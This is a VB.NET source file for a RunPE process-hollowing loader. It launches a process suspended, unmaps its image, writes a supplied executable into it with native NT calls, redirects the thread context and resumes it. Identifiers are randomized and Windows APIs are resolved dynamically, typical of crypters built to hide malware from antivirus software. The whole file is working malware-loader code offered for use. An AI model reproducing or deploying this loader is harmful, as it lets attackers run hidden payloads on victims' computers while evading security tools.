Imports System.Runtime.InteropServices
Imports System.Text

'''' <summary>
'''' Coder : Rahoz
'''' RunPE Coder : Simon-Binyo
'''' Call : Dim x AS New iDqGNekYUus: x.ApvTmhoJQq( byte() , String )
'''' Purpose : Execute App In Memory from byte array
'''' </summary>

Public Class iDqGNekYUus
    Public Declare Function XOjcjP Lib "kernel32" Alias "LoadLibraryA" (ByVal ZLO As String) As IntPtr
    Public Declare Function UCdlYS Lib "kernel32" Alias "GetProcAddress" (ByVal CLZI As IntPtr, ByVal ZLO As String) As IntPtr
    Function vwNGKRiWAZhbQL(Of T)(ByVal ZLO As String, ByVal FdeP As String) As T
        Return DirectCast(DirectCast(Marshal.GetDelegateForFunctionPointer(UCdlYS(XOjcjP(ZLO), FdeP), GetType(T)), Object), T)
    End Function
    Delegate Function IqsSCe(ByVal Bdob As IntPtr, ByVal lMFsZBcTn As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Delegate Function GWWoGg(ByVal weyn As IntPtr, ByVal frkP As IntPtr) As UInteger
    Delegate Function vDUizr(ByVal weyn As IntPtr, ByVal frkP As IntPtr, ByRef bufr As IntPtr, ByVal bufrtdzoKtXdk As Integer, ByRef QBfm As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Delegate Function Iwriwe(ByVal Bdobead As IntPtr, ByVal HCzJ As IntPtr) As UInteger
    Delegate Function MqiGia(ByVal Bdob As IntPtr, ByVal lMFsZBcTn As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Delegate Function bboTtL(ByVal weyn As IntPtr, ByVal nfSL As IntPtr, ByVal tdzoKtXdk As IntPtr, ByVal WsFn As Integer, ByVal jgcX As Integer) As IntPtr
    Delegate Function gNPEuG(ByVal weyness As IntPtr, ByVal jZUvFChgq As IntPtr, ByVal yETh As Byte(), ByVal ntdzoKtXdk As UInteger, ByVal HEIVhfeOo As Integer) As Boolean
    Public Declare Auto Function wqFfUq Lib "kernel32" Alias "CreateProcessW" (ByVal ehmj As String, ByVal NuZL As StringBuilder, ByVal lLwhebjlk As IntPtr, ByVal ahwv As IntPtr, <MarshalAs(UnmanagedType.Bool)> ByVal qFnF As Boolean, ByVal WiGG As Integer, ByVal Evtj As IntPtr, ByVal RiQS As String, ByVal hGHd As Byte(), ByVal Njae As IntPtr()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Private Function jlbnodu(ByVal mzppuAW As Long, Optional ByVal gZWwdgM As Long = &H4) As Integer
        Dim WgyvIQk As IntPtr
        Dim DIImAJt As Integer
        Dim LPEBw As vDUizr = vwNGKRiWAZhbQL(Of vDUizr)("ntdll", "NtReadVirtualMemory")
        Call LPEBw(Process.GetCurrentProcess.Handle, mzppuAW, WgyvIQk, gZWwdgM, DIImAJt)
        Return WgyvIQk
    End Function
    Public Function ApvTmhoJQq(ByVal yPaZKotP As Byte(), ByVal sYAYQtme As String) As Boolean
        Try
            Dim ZLSGrNIIb As GCHandle = GCHandle.Alloc(yPaZKotP, GCHandleType.Pinned) : Dim hModuleBase As Integer = ZLSGrNIIb.AddrOfPinnedObject : ZLSGrNIIb.Free()
            Dim lLwhebjlk As IntPtr = IntPtr.Zero
            Dim ffeYTHphf As IntPtr() = New IntPtr(3) {}
            Dim weynlQsJY As Byte() = New Byte(67) {}
            Dim dAJNjJRIO As Integer = BitConverter.ToInt32(yPaZKotP, 60)
            Dim itsaZeQaW As Integer
            Dim lMFsZBcTn As UInteger() = New UInteger(178) {}
            lMFsZBcTn(0) = &H10002
            wqFfUq(Nothing, New StringBuilder(sYAYQtme), lLwhebjlk, lLwhebjlk, False, 4, lLwhebjlk, Nothing, weynlQsJY, ffeYTHphf)
            Dim NuZLgzsRq As Integer = (hModuleBase + jlbnodu(hModuleBase + &H3C))
            itsaZeQaW = jlbnodu(NuZLgzsRq + &H34)
            Dim XmxMC As GWWoGg = vwNGKRiWAZhbQL(Of GWWoGg)("ntdll", "NtUnmapViewOfSection")
            XmxMC(ffeYTHphf(0), itsaZeQaW)
            Dim DPQNq As bboTtL = vwNGKRiWAZhbQL(Of bboTtL)("kernel32", "VirtualAllocEx")
            Dim jZUvFChgq As IntPtr = DPQNq(ffeYTHphf(0), itsaZeQaW, jlbnodu(NuZLgzsRq + &H50), &H3000, &H40)
            Dim hLGtyfGnz As New IntPtr(BitConverter.ToInt32(yPaZKotP, dAJNjJRIO + &H34))
            Dim tdzoKtXdk As New IntPtr(BitConverter.ToInt32(yPaZKotP, dAJNjJRIO + 80))
            Dim IkkqNEvUI As Integer
            Dim HEIVhfeOo As Integer
            Dim api8 As gNPEuG = vwNGKRiWAZhbQL(Of gNPEuG)("ntdll", "NtWriteVirtualMemory")
            api8(ffeYTHphf(0), jZUvFChgq, yPaZKotP, CUInt(CInt(jlbnodu(NuZLgzsRq + &H54))), IkkqNEvUI)
            For i = 0 To jlbnodu(NuZLgzsRq + &H6, 2) - 1
                Dim wjxEfPcJx As Integer() = New Integer(9) {}
                Buffer.BlockCopy(yPaZKotP, (dAJNjJRIO + &HF8) + (i * 40), wjxEfPcJx, 0, 40)
                Dim RWbBVxxC As Byte() = New Byte((wjxEfPcJx(4) - 1)) {}
                Buffer.BlockCopy(yPaZKotP, wjxEfPcJx(5), RWbBVxxC, 0, RWbBVxxC.Length)
                tdzoKtXdk = New IntPtr(jZUvFChgq.ToInt32() + wjxEfPcJx(3))
                hLGtyfGnz = New IntPtr(RWbBVxxC.Length)
                api8(ffeYTHphf(0), tdzoKtXdk, RWbBVxxC, CUInt(hLGtyfGnz), HEIVhfeOo)
            Next i
            Dim DDJVG As IqsSCe = vwNGKRiWAZhbQL(Of IqsSCe)("ntdll", "NtGetContextThread")
            DDJVG(ffeYTHphf(1), lMFsZBcTn)
            api8(ffeYTHphf(0), lMFsZBcTn(41) + &H8, BitConverter.GetBytes(jZUvFChgq.ToInt32()), CUInt(&H4), HEIVhfeOo)
            lMFsZBcTn(&H2C) = itsaZeQaW + jlbnodu(NuZLgzsRq + &H28)
            Dim tXsMU As MqiGia = vwNGKRiWAZhbQL(Of MqiGia)("ntdll", "NtSetContextThread")
            tXsMU(ffeYTHphf(1), lMFsZBcTn)
            Dim hFzSJ As Iwriwe = vwNGKRiWAZhbQL(Of Iwriwe)("ntdll", "NtResumeThread")
            hFzSJ(ffeYTHphf(1), 0)
        Catch ex As Exception
            Return False
        End Try
        Return True
    End Function
End Class
